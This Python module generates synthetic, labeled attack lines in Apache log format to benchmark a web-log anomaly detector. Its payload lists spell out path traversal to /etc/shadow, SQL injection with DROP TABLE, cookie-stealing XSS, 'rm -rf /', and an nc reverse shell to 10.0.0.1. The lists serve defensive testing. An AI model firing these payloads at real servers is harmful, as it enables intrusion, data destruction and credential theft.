"""
Synthetic anomaly injection for the web-log domain.

The project's own logs (Apache/Nginx combined) have no labels, so a baseline
cannot be measured on them directly. This module manufactures *labeled*
anomalies in the exact same log format, covering the attack classes the README
claims to detect. Injected lines are the positive class (label = 1); the real
traffic is treated as the negative class (label = 0).

Every generator is deterministic given a seed so benchmark runs are
reproducible.
"""

from __future__ import annotations

import random
from datetime import datetime, timezone
from typing import Callable, Dict, List, Tuple

_APACHE_TS = "%d/%b/%Y:%H:%M:%S +0000"

# Scanner / tooling user agents that legitimate browsers never send.
_SCANNER_UAS = [
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.00 (Nikto/2.1.5)",
    "masscan/1.3",
    "nmap-scripting-engine",
    "python-requests/2.31.0",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
]

# Path-traversal payloads.
_TRAVERSAL = [
    "/admin/../../etc/passwd",
    "/download?file=../../../../etc/shadow",
    "/static/..%2f..%2f..%2fwindows/win.ini",
    "/api/report?path=....//....//etc/hosts",
]

# SQL injection payloads.
_SQLI = [
    "/api/products?id=1' UNION SELECT username,password FROM users--",
    "/api/search?q=1;DROP TABLE users--",
    "/login?user=admin'--&pass=x",
    "/api/items?id=1 OR 1=1",
]

# XSS payloads.
_XSS = [
    "/search?q=<script>alert(document.cookie)</script>",
    "/comment?text=<img src=x onerror=eval(atob('...'))>",
    "/profile?name=<svg/onload=fetch('//evil')>",
]

# Command-injection payloads.
_CMDI = [
    "/ping?host=127.0.0.1;cat /etc/passwd",
    "/api/tools?cmd=$(rm -rf /)",
    "/export?name=`whoami`",
    "/util?input=|nc -e /bin/sh 10.0.0.1 4444",
]

# Sensitive / probing paths hit by scanners.
_PROBES = [
    "/.env",
    "/wp-login.php",
    "/.git/config",
    "/phpmyadmin/index.php",
    "/actuator/env",
    "/api/../../../../proc/self/environ",
]


def _fmt(
    ip: str,
    ts: datetime,
    method: str,
    path: str,
    status: int,
    size: int,
    ua: str,
) -> str:
    return (
        f'{ip} - - [{ts.strftime(_APACHE_TS)}] "{method} {path} HTTP/1.1" '
        f'{status} {size} "-" "{ua}"'
    )


def _rand_ip(rng: random.Random) -> str:
    return ".".join(str(rng.randint(1, 254)) for _ in range(4))


def _pick(rng: random.Random, ts: datetime, choices: List[str], status: int) -> str:
    return _fmt(_rand_ip(rng), ts, "GET", rng.choice(choices), status, 0, rng.choice(_SCANNER_UAS))


# --- individual attack-class generators -------------------------------------


def gen_traversal(rng, ts):
    return _pick(rng, ts, _TRAVERSAL, 403)


def gen_sqli(rng, ts):
    return _pick(rng, ts, _SQLI, 500)


def gen_xss(rng, ts):
    return _fmt(_rand_ip(rng), ts, "GET", rng.choice(_XSS), 200, 512, "Mozilla/5.0")


def gen_cmdi(rng, ts):
    return _pick(rng, ts, _CMDI, 500)


def gen_scanner(rng, ts):
    return _pick(rng, ts, _PROBES, 404)


def gen_long_path(rng, ts):
    junk = "/api/" + "A" * rng.randint(300, 800)
    return _fmt(_rand_ip(rng), ts, "GET", junk, 414, 0, rng.choice(_SCANNER_UAS))


def gen_weird_method(rng, ts):
    method = rng.choice(["DELETE", "PUT", "PATCH", "TRACE", "CONNECT"])
    return _fmt(_rand_ip(rng), ts, method, "/api/users/1", 200, 0, "curl/7.68.0")


def gen_server_error(rng, ts):
    return _fmt(
        _rand_ip(rng), ts, "GET", "/api/checkout", rng.choice([500, 502, 503, 599]), 0, "Mozilla/5.0"
    )


def gen_rare_status(rng, ts):
    return _fmt(_rand_ip(rng), ts, "GET", "/api/teapot", rng.choice([418, 451, 226]), 0, "Mozilla/5.0")


ATTACK_GENERATORS: Dict[str, Callable[[random.Random, datetime], str]] = {
    "path_traversal": gen_traversal,
    "sql_injection": gen_sqli,
    "xss": gen_xss,
    "command_injection": gen_cmdi,
    "scanner_probe": gen_scanner,
    "long_path": gen_long_path,
    "unusual_method": gen_weird_method,
    "server_error": gen_server_error,
    "rare_status": gen_rare_status,
}


def gen_bruteforce_burst(rng: random.Random, ts: datetime, n: int = 12) -> List[str]:
    """A single IP hammering /api/login with 401s in a tight burst."""
    ip = _rand_ip(rng)
    lines = []
    for i in range(n):
        burst_ts = ts.replace(microsecond=0)
        lines.append(
            _fmt(ip, burst_ts, "POST", "/api/login", 401, 12, "python-requests/2.31.0")
        )
    return lines


def inject_anomalies(
    time_lo: datetime,
    time_hi: datetime,
    n: int,
    *,
    seed: int = 42,
    include_bruteforce: bool = True,
) -> List[Tuple[str, str]]:
    """Generate `n` labeled anomaly log lines with timestamps in [lo, hi].

    Args:
        time_lo: Earliest timestamp for injected lines (keep them in the test window).
        time_hi: Latest timestamp.
        n: Number of single-line anomalies to generate.
        seed: RNG seed for reproducibility.
        include_bruteforce: Also emit one multi-line brute-force burst.

    Returns:
        List of (raw_log_line, attack_category).
    """
    rng = random.Random(seed)
    span = max(int((time_hi - time_lo).total_seconds()), 1)
    names = list(ATTACK_GENERATORS.keys())

    out: List[Tuple[str, str]] = []
    for _ in range(n):
        ts = time_lo.fromtimestamp(
            time_lo.timestamp() + rng.randint(0, span), tz=timezone.utc
        )
        cat = rng.choice(names)
        out.append((ATTACK_GENERATORS[cat](rng, ts), cat))

    if include_bruteforce:
        ts = time_lo.fromtimestamp(
            time_lo.timestamp() + rng.randint(0, span), tz=timezone.utc
        )
        for line in gen_bruteforce_burst(rng, ts):
            out.append((line, "brute_force"))

    return out
